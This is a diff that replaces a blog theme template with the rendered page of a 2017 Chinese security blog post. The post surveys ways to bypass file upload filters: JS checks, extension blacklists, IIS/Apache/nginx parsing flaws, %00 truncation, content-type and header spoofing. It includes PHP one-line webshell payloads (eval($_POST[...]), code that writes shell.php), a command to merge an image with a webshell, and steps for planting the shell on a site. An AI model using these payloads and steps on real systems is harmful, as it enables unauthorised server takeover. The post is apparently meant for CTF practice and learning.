@@ -1,52 +1,42 @@
-extends base
-
-block title
-  title= page.title + ' | ' + config.title
-
-block content
-  .post
-    h1.post-title= page.title
-    .post-meta= page.date.format('ll')
-      if page.categories.length > 0
-        span= ' | '
-        span.category
-          for category in page.categories.toArray()
-            a(href=url_for(category.path))= category.name
-      if theme.busuanzi == true
-        script(src='https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js', async)
-        span#busuanzi_container_page_pv= ' | '
-          span#busuanzi_value_page_pv
-          span= ' ' + __('Hits')
-    if theme.duoshuo
-      a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + '#comments')
-    if theme.disqus
-      a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + '#disqus_thread')
-    if theme.gentie
-      a.ds-thread-count(class='cloud-tie-join-count', href=url_for(page.path) + '#comments')
-        span.join-count(style='font-size: 15px; color: #6E7173;') 0
-        span= ' ' + __('Discuss')
-
-    .post-content
-      != page.content
-    if theme.shareto == true
-      script(type='text/javascript', src=url_for(theme.js) + '/share.js' + '?v=' + theme.version, async)
-      a.article-share-link(data-url='#{page.permalink}', data-id='#{page._id}')= __('shareto')
-    include _partial/tag
-    include _partial/post_nav
-    if theme.duoshuo
-      div(class='ds-share flat' data-thread-key=page.path, data-title=page.title, data-url=page.permalink)
-         .ds-share-inline
-            ul.ds-share-icons-16
-              li(data-toggle='ds-share-icons-more')
-                a(class='ds-more' href='javascript:void(0);') 分享到：
-              li
-                a(class='ds-weibo' href='javascript:void(0);' data-service='weibo') 微博
-              li
-                a(class='ds-qzone' href='javascript:void(0);' data-service='qzone') QQ空间
-              li
-                a(class='ds-qqt' href='javascript:void(0);' data-service='qqt') 腾讯微博
-              li
-                a(class='ds-wechat' href='javascript:void(0);' data-service='wechat') 微信
-            .ds-share-icons-more
-    if page.comments
-      include _partial/comments
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>常见的文件上传绕过技巧 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/6.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="/css/main.css?v=1.0.4"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body style="background:#fbfbfb;"><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">常见的文件上传绕过技巧</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/rss/"><i class="fa fa-rss"> RSS</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">常见的文件上传绕过技巧</h1><div class="post-meta">May 30, 2017<span> | </span><span class="category"><a href="/categories/php/">php</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="post-content"><h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>文件上传漏洞在各大ctf中很常见，在平时的攻防中也不可小觑，现在拿出来总结一下。</p>
+<h2 id="js验证绕过"><a href="#js验证绕过" class="headerlink" title="js验证绕过"></a>js验证绕过</h2><p>方法一：<br>直接禁用js,万事大吉。<br>讲一下火狐浏览器禁用的方法：在地址栏输入 about:config回车<br>搜索 javascript.enabled 右键切换就可以了。用完了记得切换回来偶。<br><a id="more"></a></p>
+<p>方法二：<br>查看元素，直接把js验证的函数删掉，不让他调用就可以了</p>
+<p>方法三：<br>bp抓包改包，因为bp截的是js验证之后发到服务器的包，所以上传时一定要把不合法的后缀改成合法的，然后抓包改回来，改回来的目的是让文件的最终存储方式为你想要的。</p>
+<p>方法四： 可能js只是检测了第一个点号后面的后缀，而忽略了我们可能加上去的第二个点号构造 1.jpg.php上传<br>附上一段检验js</p>
+<pre><code>function check(){
+    var filename=document.getElementById(&quot;file&quot;);
+    var str=filename.value.split(&quot;.&quot;);
+    var ext=str[1];
+    if(ext===&apos;jpg&apos;){
+        return true;
+    }else{
+              alert(&quot;请上传一张JPG格式的图片！&quot;);
+            return false;
+         }
+        return false;
+}
+</code></pre><h2 id="服务器端文件后缀名检测"><a href="#服务器端文件后缀名检测" class="headerlink" title="服务器端文件后缀名检测"></a>服务器端文件后缀名检测</h2><p>因为只有服务器这道卡，所以必须在服务器的解析上动手脚。</p>
+<p>方法一： bp改后缀名大小写混合，利用windows服务器对大小写不敏感，用样可以解析。</p>
+<p>方法二： bp改后缀，在最后加上空格，点号，下划线或者特殊后缀php5、php4啥的</p>
+<p>方法三： bp改后缀，直接双写</p>
+<p>方法四： 查找黑名单遗漏的依然能解析的后缀，比如.asa .cer .cdx</p>
+<p>方法五： IIS6.0文件解析漏洞分为两种,主要利用第二个</p>
+<p>1)只要存在一个以.asp或.asa结尾的文件夹，里面的文件不管是什么后缀都能作为asp解析.(这个用在上传后根据时间自动命名的情况，因为这种情况第二个漏洞用不了)</p>
+<p>2）分号后面不被解析 改包为sp.asp;.jpg </p>
+<p>方法六： apache 解析漏洞，利用apache从右到左解析后缀，碰见不认识的就再往前的特性，构造test.php.xyz</p>
+<p>方法七： %00截断</p>
+<p>这个分为两种类型，文件名截断和路径截断</p>
+<p>1.文件名截断:</p>
+<p>如果两次对文件后缀名的检测有差异的话，就会造成这样的漏洞，比如说第一次是检测最后一个点号后面的，发现是图片格式，满足条件。第二次把图片存储进去，%00起了作用，变成了php存进去了</p>
+<p>2.文件路径截断</p>
+<p>这种情况下抓包有一个/uploads文件夹，等会上传上去文件名会并在后面，也就是说上传的数据流会以uploads/后面跟的文件格式存储uploads/&amp;filename 如果我们在uoloads/muma.php%00那么待会&amp;filename会被截断，数据流最终会以muma.php格式存储在服务器上。<br>就会自动到了%00后面，读取的时候被截断</p>
+<p>方法八： IIS7.0畸形解析漏洞</p>
+<p>先合并一张PHP一句话图片马，合并方法：<br>①、DOS合并：copy 1.gif /b + 1.txt/a asp.gif<br>②、用edjpgcom，进行图片和一句话木马的合并，一句话代码为”&lt;?fputs(fopen(“shell.PHP”,”w”),”&lt;?eval($_POST[akt]);?&gt;”)?&gt;”<br>图片随便找一张.<br>一句话:&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[akt])?&gt;’);?&gt;<br>然后找个nginx的站,先注册一个用户然后在论坛上传一张我们刚刚合并的图片一句话马。<br>找到图片地址,然后在地址后面加个shell.php，在浏览器中运行。<br>比如假设图片地址为 <a href="http://www.xxx.com/tupian/1.jpg" target="_blank" rel="noopener">www.xxx.com/tupian/1.jpg</a><br>则执行地址为 <a href="http://www.xxx.com/tupian/1.jpg/shell.php" target="_blank" rel="noopener">www.xxx.com/tupian/1.jpg/shell.php</a><br>然后,会在目录下生成shell.php。比如: <a href="http://www.xxx.com/tupian/shell.php" target="_blank" rel="noopener">www.xxx.com/tupian/shell.php</a><br>shell.php就是我们的一句话地址。再拿一句话的客户端连接这个一句话地址就好。</p>
+<p>方法九：当遇见随机命名时，除了利用文件夹解析漏洞外，还可以抓包，本来filepath后面的内容是upfile，我们改成upfile.asp，相当于创建了一个.asp的文件夹，或者在upfile/后加上xx.asp，这样上传的文件就是asp结尾的了。</p>
+<p>方法十：conten-type 决定服务器将用什么方式去读取编码得到的文件，可以把php的content-type 改成 image/jpeg</p>
+<h2 id="服务器文件头检测"><a href="#服务器文件头检测" class="headerlink" title="服务器文件头检测"></a>服务器文件头检测</h2><pre><code>构造假的文件头
+    GIF89a  
+    &lt;head&gt;  
+    &lt;meta http-equiv = &quot;refresh&quot; content = &quot;1; url=http://www.***.com/&quot; /&gt;  
+    &lt;/head&gt;  
+</code></pre></div><script type="text/javascript" src="/js/share.js?v=1.0.4" async></script><a data-url="https://www.k0rz3n.com/2017/05/30/passupload/" data-id="cjv7v3avd001hbov84t89vcmh" class="article-share-link">Share</a><div class="tags"><a href="/tags/php/">php</a></div><div class="post-nav"><a href="/2017/05/31/pwhwireshark/" class="pre">pwnhub的一道关于流量包的misc</a><a href="/2017/05/29/iscc ctf 2017 自相矛盾 详细分析/" class="next">iscc 2017 ctf 自相矛盾 详细分析</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="side_toc"><div style="position:fixed" class="toc-article"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#导语"><span class="toc-number">1.</span> <span class="toc-text">导语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js验证绕过"><span class="toc-number">2.</span> <span class="toc-text">js验证绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务器端文件后缀名检测"><span class="toc-number">3.</span> <span class="toc-text">服务器端文件后缀名检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务器文件头检测"><span class="toc-number">4.</span> <span class="toc-text">服务器文件头检测</span></a></li></ol></div></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/byoungd/pure"> Pure Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/byoungd"> byoungd.</a></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=1.0.4" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.4" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.0.47/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.4"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.4"></script><script type="text/javascript" src="/js/prism.js?v=1.0.4"></script></div></body></html>
